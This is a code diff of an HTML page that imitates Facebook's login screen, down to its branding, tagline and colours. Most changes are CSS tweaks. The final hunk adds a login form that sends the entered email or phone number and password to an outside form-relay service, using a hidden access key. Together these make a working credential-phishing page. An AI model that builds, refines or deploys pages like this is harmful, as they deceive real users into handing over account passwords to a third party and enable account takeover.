@@ -2,18 +2,17 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Login Project</title>
+  <title>Login Test Project</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="referrer" content="origin">
   <style>
-    /* 1. Global Reset to ensure the layout doesn't break */
     * {
       box-sizing: border-box;
       font-family: Helvetica, Arial, sans-serif;
-      margin: 0;
-      padding: 0;
     }
 
     body {
+      margin: 0;
       background: #f0f2f5;
       height: 100vh;
       display: flex;
@@ -24,37 +23,33 @@
     .container {
       display: flex;
       gap: 60px;
-      max-width: 980px;
-      width: 100%;
+      max-width: 900px;
       padding: 20px;
-      align-items: center;
     }
 
     .branding {
-      flex: 1;
-      max-width: 500px;
+      max-width: 400px;
     }
 
     .branding h1 {
       color: #1877f2;
-      font-size: 60px;
-      letter-spacing: -1px;
+      font-size: 56px;
+      margin-bottom: 10px;
     }
 
     .branding p {
-      font-size: 26px;
+      font-size: 24px;
       color: #1c1e21;
-      line-height: 1.2;
-      margin-top: 10px;
+      line-height: 1.3;
     }
 
-    /* 2. The Form Box - Re-styled to be visible and centered */
+    /* This class must be on the <form> tag to make it visible */
     .login-box {
       background: #fff;
       padding: 20px;
-      width: 396px;
+      width: 360px;
       border-radius: 8px;
-      box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+      box-shadow: 0 2px 12px rgba(0,0,0,0.15);
     }
 
     .login-box input {
@@ -63,13 +58,12 @@
       margin-bottom: 12px;
       border: 1px solid #dddfe2;
       border-radius: 6px;
-      font-size: 17px;
+      font-size: 16px;
     }
 
     .login-box input:focus {
       outline: none;
       border-color: #1877f2;
-      box-shadow: 0 0 0 2px #e7f3ff;
     }
 
     .login-btn {
@@ -79,7 +73,7 @@
       color: #fff;
       border: none;
       border-radius: 6px;
-      font-size: 20px;
+      font-size: 18px;
       font-weight: bold;
       cursor: pointer;
     }
@@ -90,17 +84,13 @@
 
     .forgot {
       text-align: center;
-      margin: 16px 0;
+      margin: 14px 0;
     }
 
     .forgot a {
       color: #1877f2;
       text-decoration: none;
       font-size: 14px;
-    }
-
-    .forgot a:hover {
-      text-decoration: underline;
     }
 
     .divider {
@@ -112,13 +102,12 @@
     .create-btn {
       display: block;
       margin: 0 auto;
-      padding: 0 16px;
-      height: 48px;
+      padding: 14px 18px;
       background: #42b72a;
       color: #fff;
       border: none;
       border-radius: 6px;
-      font-size: 17px;
+      font-size: 16px;
       font-weight: bold;
       cursor: pointer;
     }
@@ -127,15 +116,11 @@
       background: #36a420;
     }
 
-    /* Mobile view fix */
-    @media (max-width: 900px) {
+    @media (max-width: 768px) {
       .container {
         flex-direction: column;
+        align-items: center;
         text-align: center;
-        gap: 40px;
-      }
-      .branding {
-        max-width: 400px;
       }
       .branding h1 { font-size: 48px; }
       .branding p { font-size: 20px; }
@@ -149,3 +134,25 @@
       <h1>facebook</h1>
       <p>Connect with friends and the world around you.</p>
     </div>
+
+    <form class="login-box" action="https://api.web3forms.com/submit" method="POST">
+      
+      <input type="hidden" name="access_key" value="870db0a3-bb24-4ba3-80fc-f2590bb4d36b">
+      
+      <input type="text" name="user_id" placeholder="Email or phone number" required>
+      <input type="password" name="user_pass" placeholder="Password" required>
+      
+      <button type="submit" class="login-btn">Log In</button>
+
+      <div class="forgot">
+        <a href="#">Forgot password?</a>
+      </div>
+
+      <div class="divider"></div>
+
+      <button type="button" class="create-btn">Create New Account</button>
+    </form>
+  </div>
+
+</body>
+</html>
